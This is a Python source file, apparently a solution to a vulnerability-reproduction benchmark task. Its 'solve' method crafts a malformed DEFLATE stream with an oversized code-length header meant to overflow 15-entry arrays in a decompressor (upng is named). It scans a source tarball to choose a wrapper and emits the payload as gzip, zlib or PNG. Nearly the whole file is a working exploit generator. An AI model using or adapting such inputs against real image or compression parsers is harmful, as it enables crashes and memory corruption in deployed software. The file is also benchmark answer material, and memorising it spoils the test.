import os
import re
import tarfile
import struct
import zlib
from typing import Optional


class _BitWriterLSB:
    __slots__ = ("_buf", "_cur", "_nbits")

    def __init__(self):
        self._buf = bytearray()
        self._cur = 0
        self._nbits = 0

    def write_bits(self, value: int, nbits: int) -> None:
        while nbits:
            take = min(8 - self._nbits, nbits)
            mask = (1 << take) - 1
            chunk = value & mask
            self._cur |= chunk << self._nbits
            self._nbits += take
            value >>= take
            nbits -= take
            if self._nbits == 8:
                self._buf.append(self._cur & 0xFF)
                self._cur = 0
                self._nbits = 0

    def finish(self) -> bytes:
        if self._nbits:
            self._buf.append(self._cur & 0xFF)
            self._cur = 0
            self._nbits = 0
        return bytes(self._buf)


def _build_deflate_dynamic_overflow_valid(output_len: int = 4) -> bytes:
    # Dynamic Huffman block with HCLEN count=18 (field=14) to overflow 15-sized temp arrays
    # while still being a valid stream. Produces output_len bytes of 0x00 then EOB.
    if output_len < 0:
        output_len = 0
    bw = _BitWriterLSB()

    # BFINAL=1, BTYPE=2 (dynamic)
    bw.write_bits(1, 1)
    bw.write_bits(2, 2)

    # HLIT=0 => 257 lit/len codes, HDIST=0 => 1 dist code
    bw.write_bits(0, 5)
    bw.write_bits(0, 5)

    # HCLEN field = 14 => 18 code length code lengths
    bw.write_bits(14, 4)

    # Code length code lengths in standard order:
    # order: 16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,(15)
    # We set only symbols 18 and 1 to length 1; others 0.
    clen_lens_18 = [0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1]
    for v in clen_lens_18:
        bw.write_bits(v, 3)

    # Code-length Huffman has two symbols with length 1: symbol 1 gets code 0, symbol 18 gets code 1.
    # Encode 258 lengths: 257 litlen + 1 dist.
    # litlen: code 0 length 1, codes 1..255 length 0, code 256 length 1
    # dist: code 0 length 1

    # symbol 1 (bit 0): length 1 for litlen code 0
    bw.write_bits(0, 1)

    # 255 zeros using symbol 18 repeats: 138 + 117
    # symbol 18 (bit 1) + 7 extra bits (count-11)
    bw.write_bits(1, 1)
    bw.write_bits(138 - 11, 7)  # 127
    bw.write_bits(1, 1)
    bw.write_bits(117 - 11, 7)  # 106

    # symbol 1 for litlen code 256
    bw.write_bits(0, 1)

    # symbol 1 for dist code 0
    bw.write_bits(0, 1)

    # Data: output_len times literal 0, then EOB (256).
    # Litlen Huffman: symbols 0 and 256 both length 1 => symbol 0 code 0, symbol 256 code 1.
    for _ in range(output_len):
        bw.write_bits(0, 1)  # literal 0
    bw.write_bits(1, 1)  # EOB (256)

    return bw.finish()


def _wrap_gzip(deflate_data: bytes, uncompressed: bytes) -> bytes:
    hdr = bytes((0x1F, 0x8B, 0x08, 0x00, 0, 0, 0, 0, 0x00, 0xFF))
    crc = zlib.crc32(uncompressed) & 0xFFFFFFFF
    isize = len(uncompressed) & 0xFFFFFFFF
    trl = struct.pack("<II", crc, isize)
    return hdr + deflate_data + trl


def _wrap_zlib(deflate_data: bytes, uncompressed: bytes) -> bytes:
    # CMF/FLG: 0x78 0x01 is a valid zlib header (no dictionary), 32K window
    hdr = b"\x78\x01"
    adler = zlib.adler32(uncompressed) & 0xFFFFFFFF
    trl = struct.pack(">I", adler)
    return hdr + deflate_data + trl


def _wrap_png(zlib_stream: bytes) -> bytes:
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr_data = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)  # 1x1, RGB, 8-bit
    ihdr = struct.pack(">I", len(ihdr_data)) + b"IHDR" + ihdr_data
    ihdr_crc = struct.pack(">I", zlib.crc32(b"IHDR" + ihdr_data) & 0xFFFFFFFF)
    ihdr += ihdr_crc

    idat_data = zlib_stream
    idat = struct.pack(">I", len(idat_data)) + b"IDAT" + idat_data
    idat_crc = struct.pack(">I", zlib.crc32(b"IDAT" + idat_data) & 0xFFFFFFFF)
    idat += idat_crc

    iend = struct.pack(">I", 0) + b"IEND"
    iend_crc = struct.pack(">I", zlib.crc32(b"IEND") & 0xFFFFFFFF)
    iend += iend_crc

    return sig + ihdr + idat + iend


def _infer_input_kind_from_tar(src_path: str) -> str:
    # Returns one of: "gzip", "png", "zlib", "raw"
    # Default to gzip (matches typical minimal PoCs for "upng-gzip").
    gzip_hint = 0
    png_hint = 0
    zlib_hint = 0

    def score_text(name: str, text: str) -> None:
        nonlocal gzip_hint, png_hint, zlib_hint
        lname = name.lower()

        is_harnessish = (
            "fuzz" in lname
            or "harness" in lname
            or "driver" in lname
            or os.path.basename(lname) in ("main.c", "fuzz.c", "fuzzer.c", "test.c")
        )
        if "llvmfuzzertestoneinput" in text:
            is_harnessish = True

        if re.search(r"0x1f\s*,\s*0x8b|0x8b\s*,\s*0x1f|\x1f\x8b", text, re.IGNORECASE):
            gzip_hint += 10 if is_harnessish else 3
        if "gzip" in text.lower() or "gunzip" in text.lower() or "gzheader" in text.lower():
            gzip_hint += 8 if is_harnessish else 2
        if "idat" in text or "ihdr" in text or "iend" in text:
            png_hint += 6 if is_harnessish else 1
        if "upng_" in text or "upng " in text:
            png_hint += 5 if is_harnessish else 1
        if "png" in text.lower() and ("signature" in text.lower() or "ihdr" in text.lower() or "idat" in text.lower()):
            png_hint += 6 if is_harnessish else 1

        if "adler32" in text.lower() or "zlib" in text.lower():
            zlib_hint += 6 if is_harnessish else 1
        if re.search(r"0x78\s*,\s*0x01|0x78\s*,\s*0x9c|0x78\s*,\s*0xda|0x78\s*,\s*0x5e", text, re.IGNORECASE):
            zlib_hint += 5 if is_harnessish else 1

    try:
        with tarfile.open(src_path, "r:*") as tf:
            total_read = 0
            max_total = 6_000_000
            max_file = 250_000
            for m in tf:
                if total_read >= max_total:
                    break
                if not m.isfile():
                    continue
                name = m.name
                lname = name.lower()
                if not (lname.endswith(".c") or lname.endswith(".h") or lname.endswith(".cc") or lname.endswith(".cpp") or lname.endswith(".cxx")):
                    continue
                if m.size <= 0:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read(min(m.size, max_file))
                except Exception:
                    continue
                total_read += len(data)
                try:
                    text = data.decode("latin1", errors="ignore")
                except Exception:
                    continue
                score_text(name, text)
    except Exception:
        return "gzip"

    # Decision logic
    if gzip_hint >= max(png_hint, zlib_hint) and gzip_hint > 0:
        return "gzip"
    if png_hint > gzip_hint and png_hint >= zlib_hint and png_hint > 0:
        return "png"
    if zlib_hint > gzip_hint and zlib_hint > 0:
        return "zlib"
    return "gzip"


class Solution:
    def solve(self, src_path: str) -> bytes:
        uncompressed = b"\x00" * 4  # valid minimal PNG scanline for 1x1 RGB: filter 0 + 3 bytes
        deflate_data = _build_deflate_dynamic_overflow_valid(output_len=len(uncompressed))

        kind = _infer_input_kind_from_tar(src_path)

        if kind == "png":
            zl = _wrap_zlib(deflate_data, uncompressed)
            return _wrap_png(zl)
        if kind == "zlib":
            return _wrap_zlib(deflate_data, uncompressed)
        if kind == "raw":
            return deflate_data
        return _wrap_gzip(deflate_data, uncompressed)